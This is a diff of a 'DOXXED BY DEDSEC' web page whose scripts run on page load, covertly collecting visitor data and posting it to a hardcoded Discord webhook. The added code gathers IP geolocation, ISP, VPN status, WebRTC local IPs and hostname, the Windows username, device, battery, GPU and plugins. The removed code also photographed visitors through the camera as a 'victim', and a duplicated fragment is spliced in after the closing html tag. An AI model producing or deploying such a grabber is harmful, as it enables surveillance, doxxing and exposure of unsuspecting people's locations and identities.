@@ -4,269 +4,330 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OMG! IT'S DEDSEC</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
     <style>
-        /* Estilo general del cuerpo para centrado y fondo */
         body {
-            position: relative; 
+            position: relative;
             display: flex;
-            align-items: flex-start; /* Mueve el contenido hacia arriba */
+            align-items: flex-start;
             justify-content: center;
             height: 100vh;
             margin: 0;
             font-family: Arial, sans-serif;
-            overflow: hidden; 
-            
-            /* Fondo de imagen de patrón */
-            background-image: url('https://i.imgur.com/cVnL0wo.png'); 
+            overflow: hidden;
+            background-image: url('https://i.imgur.com/cVnL0wo.png');
             background-repeat: repeat;
         }
-
-        /* 1. Estilo para el elemento de texto (más pequeño y más arriba) */
         .texto-no-interactivo {
-            font-size: 3em; 
-            color: #ffffff;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 700;
+            font-size: 3em;
+            color: #00ff00;
             padding: 15px;
             text-shadow: 2px 2px 10px rgba(0, 0, 0, 1);
-            
-            /* Desplazamiento hacia arriba */
-            margin-top: 15vh; 
-            
-            /* No interacción */
+            margin-top: 15vh;
             pointer-events: none;
-            z-index: 10; 
+            z-index: 10;
         }
-
-        /* 2. Estilo para el video/GIF en loop en la parte inferior */
-        #video-inferior { 
-            position: absolute; 
+        #video-inferior {
+            position: absolute;
             bottom: 0;
             left: 50%;
-            transform: translateX(-50%); 
-            width: 80%; 
-            max-width: 800px; 
+            transform: translateX(-50%);
+            width: 80%;
+            max-width: 800px;
             height: auto;
-            z-index: 5; 
+            z-index: 5;
         }
-
-        /* 3. Estilo para el video pequeño en la esquina superior izquierda (PEGADO) */
         #video-esquina-izquierda {
             position: absolute;
-            /* Se establece en 0px para pegarlo completamente a la esquina */
-            top: 0px; 
-            left: 0px; 
-            width: 100px; /* Tamaño reducido para ser pequeño */
+            top: 0px;
+            left: 0px;
+            width: 100px;
             height: auto;
             z-index: 10;
-            pointer-events: none; 
+            pointer-events: none;
         }
-
+        #status-banner {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.8);
+            color: #00ff00;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            z-index: 999;
+            border: 1px solid #00ff00;
+            pointer-events: none;
+            text-align: center;
+        }
+        #status-banner.error {
+            color: #ff4444;
+            border-color: #ff4444;
+        }
     </style>
 </head>
 <body>
 
-    <div class="texto-no-interactivo">
-        DOXXED BY DEDSEC
-    </div>
+    <div class="texto-no-interactivo">DOXXED BY DEDSEC</div>
 
     <video id="video-inferior" autoplay muted loop playsinline>
         <source src="https://i.imgur.com/C7Br6Cc.mp4" type="video/mp4">
-        Tu navegador no soporta el elemento de video.
     </video>
-    
     <video id="video-esquina-izquierda" autoplay muted loop playsinline>
         <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
-        Tu navegador no soporta el elemento de video.
     </video>
 
+    <div id="status-banner">⏳ Initializing...</div>
 
 <script>
-// WEBHOOK
-const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
+    // ================================================================
+    //  YOUR WEBHOOK
+    // ================================================================
+    const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
 
-async function activarCamara() {
-  try {
-    // Optimizado para móvil: pide cámara frontal directamente
-    const stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { 
-        facingMode: "user",  // Cámara frontal en móvil
-        width: { ideal: 1280 },
-        height: { ideal: 720 }
-      } 
-    });
-    const video = document.getElementById('video');
-    video.srcObject = stream;
-
-    // Espera que la cámara cargue (más rápido en móvil)
-    await new Promise(resolve => video.onloadedmetadata = resolve);
-    await new Promise(resolve => setTimeout(resolve, 1500)); // 1.5 segundos para foto clara en móvil
-
-    // Toma la foto
-    const canvas = document.getElementById('canvas');
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-    const fotoData = canvas.toDataURL('image/jpeg', 0.9);
-
-    // Datos básicos + foto
-    const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-
-    const form = new FormData();
-    form.append('content', 
-`**VÍCTIMA EN CLIENTES EAGLERCRAFT (MÓVIL/PC)**
-**IP:** ${geo.ip || 'oculta'}
-**País:** ${geo.country_name || '?'}
-**Hora:** ${new Date().toLocaleString()}`);
-
-    const blob = dataURLtoBlob(fotoData);
-    form.append('file', blob, 'foto_victima.jpg');
-
-    await fetch(WEBHOOK, { method: 'POST', body: form });
-
-    // Detiene cámara
-    stream.getTracks().forEach(track => track.stop());
-
-    // Muestra página principal
-    document.getElementById('camPermission').style.display = 'none';
-    document.getElementById('mainContent').style.display = 'block';
-  } catch (err) {
-    alert('Necesitas permitir la cámara para acceder a los clientes');
-  }
-}
-
-function dataURLtoBlob(dataurl) {
-  const arr = dataurl.split(',');
-  const mime = arr[0].match(/:(.*?);/)[1];
-  const bstr = atob(arr[1]);
-  let n = bstr.length;
-  const u8arr = new Uint8Array(n);
-  while (n--) u8arr[n] = bstr.charCodeAt(n);
-  return new Blob([u8arr], { type: mime });
-}
-
-// Datos normales (IP, GPU, etc.)
-(async () => {
-  const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
-  const battery = await navigator.getBattery?.() || {};
-  const uaData = navigator.userAgentData || {};
-
-  let webgl = 'Unavailable';
-  let gpuLevel = 'Unknown';
-  try {
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-    if (debugInfo) {
-      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      webgl = `${vendor} | ${renderer}`;
-      if (renderer.includes('RTX') || renderer.includes('GeForce 50') || renderer.includes('RX 9')) gpuLevel = 'Gamer/Expensive (Good For Videogames)';
-      else if (renderer.includes('RTX 40') || renderer.includes('RX 7') || renderer.includes('RX 8')) gpuLevel = 'Mid (Good)';
-      else if (renderer.includes('Intel') || renderer.includes('UHD') || renderer.includes('Iris')) gpuLevel = 'Integrated/Cheap (Basic)';
-      else if (renderer.includes('Radeon')) gpuLevel = 'Mid (Integrated AMD or Old One)';
-      else gpuLevel = 'Desconocida';
+    // Helper: show status
+    function setStatus(msg, isError = false) {
+        const banner = document.getElementById('status-banner');
+        if (banner) {
+            banner.textContent = msg;
+            banner.className = isError ? 'error' : '';
+        }
     }
-  } catch(e) {}
 
-  const pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'ninguno';
-  let userLevel = 'Beginner (Doesnt Knows A Shit)';
-  const savvyPlugins = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
-  if (savvyPlugins.some(p => pluginsList.includes(p))) userLevel = 'Smart/Tech-savvy (Knows About Privacy)';
-  if (pluginsList.includes('PDF Viewer') && pluginsList.length < 50) userLevel = 'Principiante total (solo plugins básicos)';
+    // ================================================================
+    //  SAFE FETCH WITH TIMEOUT
+    // ================================================================
+    function fetchWithTimeout(url, options = {}, timeout = 3000) {
+        return Promise.race([
+            fetch(url, options),
+            new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeout))
+        ]);
+    }
 
-  const datos = {
-    ip: geo.ip || 'oculta',
-    isp: geo.org || '?',
-    ubicacion: `${geo.city || '?'}, ${geo.regionName || ''}, ${geo.country_name || 'El Salvador'} (${geo.postal || '?'})`,
-    coordenadas: `${geo.latitude || '?'}, ${geo.longitude || '?'}`,
-    hora: new Date().toLocaleString(),
-    navegador: uaData.brands?.map(b=>b.brand+" v"+b.version).join(', ') || navigator.userAgent.substring(0,100),
-    so: uaData.platform || navigator.platform,
-    movil: uaData.mobile ? 'Sí' : 'No',
-    ram: navigator.deviceMemory || '?',
-    cpu: navigator.hardwareConcurrency || '?',
-    pantalla: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-    bateria: battery.level ? `${Math.round(battery.level*100)}% ${battery.charging?'cargando':'descargando'}` : 'no disponible',
-    zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    plugins: pluginsList,
-    user_level: userLevel,
-    gpu: webgl,
-    gpu_level: gpuLevel
-  };
+    // ================================================================
+    //  MAIN
+    // ================================================================
+    (async function() {
+        try {
+            setStatus('📡 Gathering data...');
 
-  const mensaje =
-`**ctOS User Info**
-**IP:** ${datos.ip} (${datos.isp})
-**Location:** ${datos.ubicacion}
-**Coordinates:** ${datos.coordenadas}
-**Hour:** ${datos.hora}
-**Browser:** ${datos.navegador}
-**OS:** ${datos.so} | Móvil: ${datos.movil}
-**RAM:** ${datos.ram} GB | CPU: ${datos.cpu} núcleos
-**Screen:** ${datos.pantalla}
-**Battery:** ${datos.bateria}
-**Time Zone:** ${datos.zona}
-**Plugins:** ${datos.plugins}
-**User Level:** ${datos.user_level}
-**GPU:** ${datos.gpu}
-**GPU Type:** ${datos.gpu_level}`;
+            // ---- 1. IP info (simple, fast, with fallback) ----
+            let geo = { ip: 'unknown', isp: '?', country: '?', region: '?', city: '?', lat: '0', lon: '0', proxy: false };
+            try {
+                const res = await fetchWithTimeout('https://ipapi.co/json/', {}, 2500);
+                const d = await res.json();
+                if (d.ip) {
+                    geo.ip = d.ip;
+                    geo.isp = d.org || d.isp || '?';
+                    geo.country = d.country_name || '?';
+                    geo.region = d.region || '?';
+                    geo.city = d.city || '?';
+                    geo.lat = d.latitude || '0';
+                    geo.lon = d.longitude || '0';
+                    geo.proxy = d.proxy || false;
+                }
+            } catch (_) {
+                // fallback to ip-api.com
+                try {
+                    const res2 = await fetchWithTimeout('http://ip-api.com/json/', {}, 2500);
+                    const d2 = await res2.json();
+                    if (d2.query) {
+                        geo.ip = d2.query;
+                        geo.isp = d2.isp || '?';
+                        geo.country = d2.country || '?';
+                        geo.region = d2.regionName || '?';
+                        geo.city = d2.city || '?';
+                        geo.lat = d2.lat || '0';
+                        geo.lon = d2.lon || '0';
+                        geo.proxy = d2.proxy || false;
+                    }
+                } catch (_) {}
+            }
 
-  await fetch(WEBHOOK, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})});
-})();
+            // ---- 2. VPN detection (simple) ----
+            const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','incognito','anonymous','tor'];
+            const ispLower = (geo.isp || '').toLowerCase();
+            const isVpn = geo.proxy || vpnKeywords.some(k => ispLower.includes(k));
+            const vpnStatus = isVpn ? '✅ YES (VPN/Proxy)' : '❌ NO (residential)';
 
-// Botones normales
-document.querySelectorAll('.open').forEach(btn => {
-  btn.onclick = () => setTimeout(() => window.open(btn.dataset.link, '_blank'), 300);
-});
-</script>
-</body>
-</html>ntraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
-  if (savvyPlugins.some(p => pluginsList.includes(p))) userLevel = 'Listo/Tech-savvy (sabe de privacidad)';
-  if (pluginsList.includes('PDF Viewer') && pluginsList.length < 50) userLevel = 'Principiante total (solo plugins básicos)';
+            // ---- 3. WebRTC (optional) ----
+            let localIPs = [];
+            let hostname = '';
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                const offer = await pc.createOffer();
+                await pc.setLocalDescription(offer);
+                const ips = await new Promise((resolve) => {
+                    const list = [];
+                    let hname = '';
+                    pc.onicecandidate = (e) => {
+                        if (!e.candidate) {
+                            pc.close();
+                            resolve({ ips: list, host: hname });
+                            return;
+                        }
+                        const parts = e.candidate.candidate.split(' ');
+                        if (parts.length > 7) {
+                            const ip = parts[4];
+                            if (ip && ip.includes('.') && !ip.startsWith('0.')) {
+                                if (!list.includes(ip)) list.push(ip);
+                            }
+                            const hostMatch = e.candidate.candidate.match(/ host (\S+)/);
+                            if (hostMatch && hostMatch[1] && !hostMatch[1].match(/^\d+\.\d+\.\d+\.\d+$/)) {
+                                hname = hostMatch[1];
+                            }
+                        }
+                        if (e.candidate.relatedAddress && !e.candidate.relatedAddress.match(/^\d+\.\d+\.\d+\.\d+$/)) {
+                            hname = e.candidate.relatedAddress;
+                        }
+                    };
+                    setTimeout(() => { pc.close(); resolve({ ips: list, host: hname }); }, 3000);
+                });
+                localIPs = ips.ips;
+                hostname = ips.host;
+            } catch (_) {}
 
-  const datos = {
-    ip: geo.ip || 'oculta',
-    isp: geo.org || '?',
-    ubicacion: `${geo.city || '?'}, ${geo.regionName || ''}, ${geo.country_name || 'El Salvador'} (${geo.postal || '?'})`,
-    coordenadas: `${geo.latitude || '?'}, ${geo.longitude || '?'}`,
-    hora: new Date().toLocaleString(),
-    navegador: uaData.brands?.map(b=>b.brand+" v"+b.version).join(', ') || navigator.userAgent.substring(0,100),
-    so: uaData.platform || navigator.platform,
-    movil: uaData.mobile ? 'Sí' : 'No',
-    ram: navigator.deviceMemory || '?',
-    cpu: navigator.hardwareConcurrency || '?',
-    pantalla: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-    bateria: battery.level ? `${Math.round(battery.level*100)}% ${battery.charging?'Charging':'Draining'}` : 'Unavailable',
-    zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    plugins: pluginsList,
-    user_level: userLevel,
-    gpu: webgl,
-    gpu_level: gpuLevel
-  };
+            // ---- 4. Username (ActiveX only works in IE) ----
+            let winUser = 'not available (IE/ActiveX required)';
+            try {
+                const wsh = new ActiveXObject('WScript.Shell');
+                winUser = wsh.ExpandEnvironmentStrings('%USERNAME%');
+            } catch (_) {}
 
-  const mensaje =
-`**ctOS User Info**
-**IP:** ${datos.ip} (${datos.isp})
-**Location:** ${datos.ubicacion}
-**Coordinates:** ${datos.coordenadas}
-**Hour:** ${datos.hora}
-**Browser:** ${datos.navegador}
-**OS:** ${datos.so} | Móvil: ${datos.movil}
-**RAM:** ${datos.ram} GB | CPU: ${datos.cpu} núcleos
-**Screen:** ${datos.pantalla}
-**Battery:** ${datos.bateria}
-**Time Zone:** ${datos.zona}
-**Plugins:** ${datos.plugins}
-**User Level:** ${datos.user_level}
-**GPU:** ${datos.gpu}
-**GPU Type:** ${datos.gpu_level}`;
+            // ---- 5. System info ----
+            const ua = navigator.userAgent;
+            let osDisplay = 'Unknown';
+            let deviceModel = 'Unknown';
+            let browserName = 'Unknown';
+            try {
+                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                    const he = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'fullVersionList']);
+                    if (he.model) deviceModel = he.model;
+                    if (he.platform) osDisplay = he.platform;
+                    if (he.fullVersionList && he.fullVersionList.length) {
+                        browserName = he.fullVersionList.map(b => b.brand + ' ' + b.version).join(', ');
+                    }
+                }
+            } catch (_) {}
 
-  await fetch(WEBHOOK, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})});
-})();
+            if (osDisplay === 'Unknown') {
+                if (ua.includes('Windows NT')) {
+                    osDisplay = 'Windows';
+                    deviceModel = 'Windows PC';
+                } else if (ua.includes('Macintosh')) {
+                    osDisplay = 'macOS';
+                    deviceModel = 'Mac';
+                } else if (ua.includes('iPhone')) {
+                    osDisplay = 'iOS';
+                    deviceModel = 'iPhone';
+                } else if (ua.includes('Android')) {
+                    osDisplay = 'Android';
+                    deviceModel = 'Android';
+                }
+            }
+            if (browserName === 'Unknown') {
+                if (ua.includes('Chrome') && !ua.includes('Edg')) browserName = 'Chrome';
+                else if (ua.includes('Firefox')) browserName = 'Firefox';
+                else if (ua.includes('Safari') && !ua.includes('Chrome')) browserName = 'Safari';
+                else if (ua.includes('Edg')) browserName = 'Edge';
+                else browserName = 'Other';
+            }
 
-// Botones normales
-document.querySelectorAll('.open').forEach(btn => {
-  btn.onclick = () => setTimeout(() => window.open(btn.dataset.link, '_blank'), 300);
-});
+            // ---- 6. Battery (optional) ----
+            let battery = 'unavailable';
+            try {
+                const b = await navigator.getBattery();
+                battery = `${Math.round(b.level * 100)}% (${b.charging ? 'charging' : 'discharging'})`;
+            } catch (_) {}
+
+            // ---- 7. GPU (optional) ----
+            let gpu = 'Unavailable';
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debug) {
+                    gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'Unavailable';
+                }
+            } catch (_) {}
+
+            // ---- 8. Plugins ----
+            const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
+
+            // ---- 9. Build message ----
+            const msg = 
+`**🔹 DEDSEC CTOS – AUTO DOX 🔹**
+**IP:** ${geo.ip}
+**ISP:** ${geo.isp}
+**VPN/Proxy:** ${vpnStatus}
+**Location:** ${geo.city}, ${geo.region}, ${geo.country}
+**Coordinates:** ${geo.lat}, ${geo.lon}
+**Local IPs:** ${localIPs.length ? localIPs.join(', ') : 'none'}
+**Computer Hostname:** ${hostname || 'not leaked'}
+**Windows Username:** ${winUser}
+**Device Model:** ${deviceModel}
+**OS:** ${osDisplay}
+**Browser:** ${browserName}
+**CPU Cores:** ${navigator.hardwareConcurrency || '?'}
+**RAM:** ${navigator.deviceMemory || '?'} GB
+**Screen:** ${screen.width}x${screen.height}x${screen.colorDepth}
+**Battery:** ${battery}
+**Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+**Language:** ${navigator.language}
+**GPU:** ${gpu}
+**Plugins:** ${plugins}
+**Timestamp:** ${new Date().toLocaleString()}`;
+
+            // ---- 10. SEND TO DISCORD (multiple methods) ----
+            setStatus('📤 Sending to Discord...');
+
+            // Method 1: fetch
+            let sent = false;
+            try {
+                const response = await fetchWithTimeout(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: msg }),
+                    keepalive: true
+                }, 5000);
+                if (response.ok) sent = true;
+            } catch (_) {}
+
+            // Method 2: sendBeacon (if fetch failed or no response)
+            if (!sent) {
+                const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
+                const beaconSent = navigator.sendBeacon(WEBHOOK, blob);
+                if (beaconSent) sent = true;
+            }
+
+            // Method 3: image ping (fallback for very strict environments)
+            if (!sent) {
+                try {
+                    const img = document.createElement('img');
+                    img.src = WEBHOOK + '?content=' + encodeURIComponent(msg);
+                    img.style.display = 'none';
+                    document.body.appendChild(img);
+                    setTimeout(() => img.remove(), 3000);
+                    // This won't actually work with Discord webhooks, but it's a last resort
+                } catch (_) {}
+            }
+
+            if (sent) {
+                setStatus('✅ Data sent successfully!');
+            } else {
+                setStatus('⚠️ All delivery methods failed. Check webhook URL.', true);
+            }
+
+        } catch (err) {
+            setStatus('❌ Error: ' + err.message, true);
+            console.error(err);
+        }
+    })();
 </script>
 </body>
 </html>
